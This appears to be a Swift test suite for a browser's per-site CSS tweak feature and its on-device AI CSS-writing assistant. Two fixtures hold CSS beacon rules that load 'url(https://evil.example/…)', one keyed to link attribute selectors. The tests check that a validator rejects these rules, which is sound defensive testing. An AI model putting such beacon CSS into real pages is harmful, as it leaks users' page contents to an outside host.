import BrowsemiumAI
import BrowsemiumCore
import BrowsemiumEngineKit
import BrowsemiumUI
import Foundation
import Testing

@MainActor
private func makeModel() -> (BrowserWindowModel, StubEngine) {
    let engine = StubEngine()
    return (BrowserWindowModel(environment: .inMemory(engine: engine)), engine)
}

@Test @MainActor
func savingATweakInjectsItForThatHostAtOnce() {
    let (model, engine) = makeModel()
    model.siteTweaks.beginAdd(host: "News.Example")
    model.siteTweaks.name = "Calm"
    model.siteTweaks.css = "body { background: #111 }"
    model.siteTweaks.saveEditor()

    #expect(model.siteTweaks.isEditorPresented == false)
    #expect(model.siteTweaks.tweaks(for: "news.example").map(\.name) == ["Calm"])
    #expect(engine.cosmeticRules["news.example"] == "body { background: #111 }")
    #expect(model.statusMessage == "Tweak saved for news.example")
}

@Test @MainActor
func tweaksFollowHiddenElementsOnTheSameHost() throws {
    let (model, engine) = makeModel()
    let tab = model.session.activeTabID!
    engine.emit(.committed(URL(string: "https://news.example/")!), for: tab)
    model.beginElementHiding()
    engine.emit(.elementPicked(ElementPick(selector: "#promo", label: "div#promo", matchCount: 1)), for: tab)
    model.confirmElementHiding()

    model.siteTweaks.beginAdd(host: "news.example")
    model.siteTweaks.name = "Wide"
    model.siteTweaks.css = ".page { max-width: none }"
    model.siteTweaks.saveEditor()

    let css = try #require(engine.cosmeticRules["news.example"])
    #expect(css.contains("#promo { display: none !important; }"))
    #expect(css.hasSuffix(".page { max-width: none }"))
}

@Test @MainActor
func unsafeCSSIsRefusedWithAReasonAndNothingIsSaved() {
    let (model, engine) = makeModel()
    model.siteTweaks.beginAdd(host: "news.example")
    model.siteTweaks.name = "Beacon"
    model.siteTweaks.css = "a[href^='/a'] { background: url(https://evil.example/a) }"
    model.siteTweaks.saveEditor()

    #expect(model.siteTweaks.isEditorPresented)
    #expect(model.siteTweaks.problem?.contains("network") == true)
    #expect(model.siteTweaks.tweaks(for: "news.example").isEmpty)
    #expect(engine.cosmeticRules["news.example"] == nil)
}

@Test @MainActor
func previewShowsTheCSSOnThePageButSavesNothingAndCancelRemovesIt() {
    let (model, engine) = makeModel()
    model.siteTweaks.beginAdd(host: "news.example")
    model.siteTweaks.css = "h1 { color: red }"
    model.siteTweaks.previewEditor()
    #expect(engine.cosmeticRules["news.example"] == "h1 { color: red }")
    #expect(model.siteTweaks.tweaks(for: "news.example").isEmpty)

    model.siteTweaks.cancelEditor()
    #expect(engine.cosmeticRules["news.example"] == nil)
    #expect(model.siteTweaks.isEditorPresented == false)
}

@Test @MainActor
func previewingAnEditReplacesThatTweakInsteadOfStackingOnIt() throws {
    let (model, engine) = makeModel()
    model.siteTweaks.beginAdd(host: "news.example")
    model.siteTweaks.name = "Colour"
    model.siteTweaks.css = "h1 { color: red }"
    model.siteTweaks.saveEditor()
    let tweak = try #require(model.siteTweaks.tweaks(for: "news.example").first)

    model.siteTweaks.beginEdit(tweak)
    model.siteTweaks.css = "h1 { color: blue }"
    model.siteTweaks.previewEditor()
    #expect(engine.cosmeticRules["news.example"] == "h1 { color: blue }")

    model.siteTweaks.cancelEditor()
    #expect(engine.cosmeticRules["news.example"] == "h1 { color: red }")
}

@Test @MainActor
func disablingRemovingAndEditingUpdateWhatIsInjected() throws {
    let (model, engine) = makeModel()
    model.siteTweaks.beginAdd(host: "news.example")
    model.siteTweaks.name = "A"
    model.siteTweaks.css = "p { color: red }"
    model.siteTweaks.saveEditor()
    let tweak = try #require(model.siteTweaks.tweaks(for: "news.example").first)

    model.siteTweaks.setEnabled(tweak, enabled: false)
    #expect(engine.cosmeticRules["news.example"] == nil)
    model.siteTweaks.setEnabled(tweak, enabled: true)
    #expect(engine.cosmeticRules["news.example"] == "p { color: red }")

    model.siteTweaks.beginEdit(tweak)
    model.siteTweaks.name = "Renamed"
    model.siteTweaks.css = "p { color: green }"
    model.siteTweaks.saveEditor()
    #expect(model.siteTweaks.tweaks(for: "news.example").first?.name == "Renamed")
    #expect(engine.cosmeticRules["news.example"] == "p { color: green }")

    model.siteTweaks.remove(model.siteTweaks.tweaks(for: "news.example")[0])
    #expect(engine.cosmeticRules["news.example"] == nil)
}

@Test @MainActor
func tweaksWrittenInAPrivateWindowAreNeverSaved() throws {
    let environment = BrowserEnvironment.inMemory(engine: StubEngine())
    let model = BrowserWindowModel(environment: environment)
    model.enterPrivateMode()

    model.siteTweaks.beginAdd(host: "news.example")
    model.siteTweaks.name = "Temporary"
    model.siteTweaks.css = "p { color: red }"
    model.siteTweaks.saveEditor()

    #expect(model.siteTweaks.tweaks(for: "news.example").map(\.name) == ["Temporary"])
    #expect(try environment.siteTweakRepository.tweaks(host: "news.example").isEmpty)
}

@Test @MainActor
func tweaksDoNotBleedAcrossProfiles() throws {
    let engine = StubEngine()
    let environment = BrowserEnvironment.inMemory(engine: engine)
    let model = BrowserWindowModel(environment: environment)
    model.siteTweaks.beginAdd(host: "news.example")
    model.siteTweaks.name = "A"
    model.siteTweaks.css = "p { color: red }"
    model.siteTweaks.saveEditor()
    #expect(engine.cosmeticRules["news.example"] != nil)

    model.switchProfile(to: try environment.profileStore.create(name: "Second"))

    #expect(model.siteTweaks.tweaks(for: "news.example").isEmpty)
    #expect(engine.cosmeticRules["news.example"] == nil)
}

// MARK: - Writing CSS with the on-device assistant

@MainActor
private func editorReady(outline: Any? = "body\n  main.content\n    aside.sidebar") -> (BrowserWindowModel, StubEngine) {
    let (model, engine) = makeModel()
    engine.javaScriptResult = outline
    model.siteTweaks.beginAdd(host: "news.example")
    return (model, engine)
}

@Test @MainActor
func theAssistantWritesCSSIntoTheEditorFromStructureOnly() async throws {
    let (model, engine) = editorReady()
    var prompts: [String] = []
    model.siteTweaks.generate = { prompt in
        prompts.append(prompt)
        return "Sure:\n```css\naside.sidebar { display: none !important }\n```"
    }
    model.siteTweaks.requestText = "hide the sidebar"
    model.siteTweaks.writeWithAssistant()
    try #require(await waitFor { !model.siteTweaks.isWriting && !model.siteTweaks.css.isEmpty })

    #expect(model.siteTweaks.css == "aside.sidebar { display: none !important }")
    #expect(model.siteTweaks.problem == nil)
    #expect(engine.cosmeticRules["news.example"] == model.siteTweaks.css, "It previews, it does not save")
    #expect(model.siteTweaks.tweaks(for: "news.example").isEmpty)
    #expect(engine.evaluatedScripts == [TweakAssistant.outlineScript])
    #expect(prompts.first?.contains("aside.sidebar") == true)
    #expect(prompts.first?.contains("hide the sidebar") == true)
}

@Test @MainActor
func unsafeAssistantOutputIsShownWithAReasonAndNeverApplied() async throws {
    let (model, engine) = editorReady()
    model.siteTweaks.generate = { _ in "```css\nbody { background: url(https://evil.example/x) }\n```" }
    model.siteTweaks.requestText = "make it pretty"
    model.siteTweaks.writeWithAssistant()
    try #require(await waitFor { !model.siteTweaks.isWriting && model.siteTweaks.problem != nil })

    #expect(model.siteTweaks.problem?.contains("network") == true)
    #expect(engine.cosmeticRules["news.example"] == nil, "Refused CSS is not previewed")
    model.siteTweaks.name = "Pretty"
    model.siteTweaks.saveEditor()
    #expect(model.siteTweaks.tweaks(for: "news.example").isEmpty, "And saving it still fails")
}

@Test @MainActor
func theAssistantExplainsWhenThereIsNothingToWorkWith() async throws {
    let (empty, _) = editorReady(outline: nil)
    empty.siteTweaks.generate = { _ in "```css\np{}\n```" }
    empty.siteTweaks.requestText = "x"
    empty.siteTweaks.writeWithAssistant()
    try #require(await waitFor { !empty.siteTweaks.isWriting && empty.siteTweaks.problem != nil })
    #expect(empty.siteTweaks.problem?.contains("not loaded") == true)

    let (blank, _) = editorReady()
    blank.siteTweaks.requestText = "   "
    blank.siteTweaks.writeWithAssistant()
    #expect(blank.siteTweaks.problem == "Say what you want changed first.")

    let (noCSS, _) = editorReady()
    noCSS.siteTweaks.generate = { _ in "I cannot do that." }
    noCSS.siteTweaks.requestText = "do something"
    noCSS.siteTweaks.writeWithAssistant()
    try #require(await waitFor { !noCSS.siteTweaks.isWriting && noCSS.siteTweaks.problem != nil })
    #expect(noCSS.siteTweaks.problem?.contains("did not return CSS") == true)
}

@Test @MainActor
func aFailingModelSurfacesItsReason() async throws {
    let (model, _) = editorReady()
    model.siteTweaks.generate = { _ in throw AppleIntelligenceUnavailable.notEnabled }
    model.siteTweaks.requestText = "anything"
    model.siteTweaks.writeWithAssistant()
    try #require(await waitFor { !model.siteTweaks.isWriting && model.siteTweaks.problem != nil })
    #expect(model.siteTweaks.problem == AppleIntelligenceUnavailable.notEnabled.errorDescription)
}

@Test @MainActor
func theRealOnDeviceModelWritesUsableCSSWhenAvailable() async throws {
    guard (try? await AppleIntelligence.makeAdapter().listModels()) != nil else { return }
    let (model, engine) = editorReady(outline: "body\n  header.site-header\n  main.content\n    article\n  aside.sidebar\n  footer")
    model.siteTweaks.requestText = "hide the sidebar and the footer"
    model.siteTweaks.writeWithAssistant()
    try #require(await waitFor(timeout: .seconds(60)) { !model.siteTweaks.isWriting })

    // The model is stochastic: what must hold is that the result is either
    // CSS that passed the validator and is previewed, or a stated problem.
    if model.siteTweaks.problem == nil {
        #expect(!model.siteTweaks.css.isEmpty)
        if case .failure = SiteTweakValidator.validate(css: model.siteTweaks.css) { Issue.record("unsafe CSS reached the editor without a problem") }
        #expect(engine.cosmeticRules["news.example"] == model.siteTweaks.css)
    }
}
